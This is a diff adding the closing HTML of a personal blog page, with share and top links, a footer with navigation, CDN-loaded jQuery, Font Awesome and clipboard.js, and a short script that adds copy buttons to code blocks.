+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022-2077
+    tianstcht
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/friend/">Friend</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/tianstcht">Github</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
